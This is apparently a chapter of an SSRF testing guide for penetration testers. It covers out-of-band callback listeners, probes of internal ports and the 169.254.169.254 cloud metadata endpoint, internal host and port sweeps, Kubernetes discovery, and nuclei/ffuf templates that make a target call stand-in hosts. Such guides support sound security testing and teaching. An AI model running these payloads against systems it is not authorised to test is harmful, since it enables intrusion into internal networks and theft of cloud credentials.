# 02 — Detection Methodology

## 2.1 Setting Up Out-of-Band (OOB) Infrastructure

OOB detection is **mandatory** for blind SSRF — always have a listener ready before testing.

### Option A: Burp Collaborator (Pro)
```
1. Burp → Burp Collaborator client → Copy to clipboard
   e.g., xyz123abc.burpcollaborator.net
2. Use in payloads: http://xyz123abc.burpcollaborator.net/
3. Poll collaborator after sending each request
4. Look for: DNS interaction, HTTP interaction, HTTPS interaction
```

### Option B: interactsh (Free, open-source)
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start listener
interactsh-client

# You get a URL like: xyz123.oast.fun
# Use: http://xyz123.oast.fun/ in payloads
```

### Option C: canarytokens.org (Quick browser-based)
```
1. Go to canarytokens.org
2. Select "Web bug / URL token"
3. Get a unique URL → use in payloads
4. Get email alerts when triggered
```

### Option D: Self-hosted (Netcat / Python)
```bash
# Netcat listener (one-off)
nc -lvnp 8080

# Python HTTP server
python3 -m http.server 8080

# Public exposure via ngrok
ngrok http 8080
# Use the ngrok URL in payloads
```

---

## 2.2 Regular (Non-Blind) SSRF Detection

The server returns content from the fetched resource in its HTTP response.

### Step 1 — Test with echo server
```bash
# Set up echo endpoint and submit URL
curl -X POST https://target.com/api/fetch \
  -d "url=http://YOUR.SERVER:8080/test1" \
  --proxy http://127.0.0.1:8080  # Route through Burp

# Watch your server for the request
# Check if response body contains data from your server
```

### Step 2 — Probe for internal services using known banners
```
http://127.0.0.1:22/       ← SSH: "SSH-2.0-OpenSSH..."
http://127.0.0.1:21/       ← FTP: "220 FTP Server ready"
http://127.0.0.1:25/       ← SMTP: "220 mail.example.com ESMTP"
http://127.0.0.1:6379/     ← Redis: "-NOAUTH Authentication required"
http://127.0.0.1:11211/    ← Memcached: banner or STAT output
http://127.0.0.1:9200/     ← Elasticsearch: JSON cluster info
http://127.0.0.1:8500/     ← Consul: API response
http://127.0.0.1:2375/     ← Docker API: JSON engine info
http://127.0.0.1:5000/     ← Common Flask dev server
http://127.0.0.1:8080/     ← Common proxy/admin/app
http://127.0.0.1:8443/     ← HTTPS alt port
http://127.0.0.1:3000/     ← Node.js / Grafana / GitLab
http://127.0.0.1:4567/     ← Common API port
```

### Step 3 — Response analysis signals
Look for these differences in responses compared to baseline:
- Response body length changes
- Response time differences (> 2 seconds = something listening)
- HTTP status code changes (200 vs 403 vs 500)
- Error messages containing internal hostnames or IP addresses
- Headers revealing internal service names (`Server: nginx/internal-v1.2`)

---

## 2.3 Blind SSRF Detection

No response data — rely entirely on OOB interactions.

### DNS-only callback (firewall may block HTTP but not DNS)
```
# Many WAFs block outbound HTTP to attacker IPs but allow DNS
# Always test DNS callback separately from HTTP
http://ssrf.YOUR.INTERACTSH.HOST/path
# If DNS fires but HTTP doesn't → DNS-only blind SSRF → still reportable
```

### HTTP Status Code Differentiation
```
Open port:     HTTP 200, 403, 500, or service-specific response
Closed port:   TCP RST → very fast response (< 100ms) or specific error
Filtered port: Timeout → slow response (5-30 seconds)
```

Use Burp Intruder with timing analysis:
```
Payload list: 127.0.0.1:22, 127.0.0.1:80, 127.0.0.1:443, 127.0.0.1:3306...
Sort by response time — outliers indicate open/filtered ports
```

### Error Message Leakage (Semi-blind)
```
# Port closed: "Connection refused" or specific TCP error
# Port open but wrong protocol: service error message
# Firewall filtered: "Connection timed out"
# DNS failure: "Could not resolve host: ..."

# These error differences let you map the internal network without OOB
```

---

## 2.4 Internal Network Discovery via SSRF

Once you have confirmed SSRF, enumerate the internal network:

### Common Cloud Internal Ranges
```
# AWS
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.169.254/32  ← metadata

# GCP
10.128.0.0/9
169.254.169.254/32  ← metadata

# Azure
10.0.0.0/8
169.254.169.254/32  ← metadata
```

### Port Scanning via SSRF (Burp Intruder)
```
# Step 1: Find live hosts
Payload: http://10.0.0.§1§/
Range: 1-254
Analyze: response length/time differences

# Step 2: Port scan confirmed live hosts
Payload: http://10.0.0.1:§port§/
Port list: 21,22,23,25,53,80,110,143,443,445,3306,5432,6379,8080,8443,9200,27017
```

### Kubernetes Internal Discovery
```
https://kubernetes.default.svc/
https://kubernetes.default.svc.cluster.local/
http://10.96.0.1/  ← default Kubernetes API server IP

# Service discovery via DNS
http://internal-service.default.svc.cluster.local/
```

---

## 2.5 SSRF in API Responses (Indirect Detection)

Sometimes SSRF doesn't show in the immediate response but in later API calls or logs:

### Asynchronous SSRF
```
# App accepts URL, queues job, processes later
POST /api/import {"url": "http://169.254.169.254/latest/meta-data/"}
# Response: {"job_id": "abc123", "status": "pending"}

# Poll job status
GET /api/jobs/abc123
# Response may contain fetched content after processing completes
```

### SSRF via Background Jobs
```
# Common in: email senders, report generators, data importers
# Test: Submit URL, wait 30 seconds, check for OOB callback
# Also check: emails sent to user, downloadable reports, export files
```

---

## 2.6 Automation for Blind SSRF Discovery

### Nuclei Templates
```bash
# Run SSRF-specific templates
nuclei -u https://target.com -t vulnerabilities/generic/generic-ssrf.yaml
nuclei -u https://target.com -t vulnerabilities/generic/blind-ssrf.yaml

# Custom template with your Collaborator server
cat > /tmp/ssrf-test.yaml << EOF
id: custom-ssrf-test
info:
  name: Custom SSRF Test
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}?url=http://{{interactsh-url}}"
      - "{{BaseURL}}?redirect=http://{{interactsh-url}}"
      - "{{BaseURL}}?src=http://{{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
EOF
nuclei -u https://target.com -t /tmp/ssrf-test.yaml -iserver YOUR.INTERACTSH.HOST
```

### ffuf for parameter discovery + SSRF
```bash
# Fuzz parameters for SSRF
ffuf -u "https://target.com/api/endpoint?FUZZ=http://YOUR.INTERACTSH.HOST" \
  -w /path/to/params-wordlist.txt \
  -mc 200,201,301,302,400,500 \
  -o results.json

# Wordlist for SSRF params
# Use: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
```

### gau + grep for URL parameters
```bash
# Discover URLs with SSRF-prone params from historical data
echo "target.com" | gau | grep -E "[?&](url|src|href|path|link|callback|redirect|return|next|image|avatar|logo|webhook|endpoint|uri|fetch|proxy|load|resource)="
```
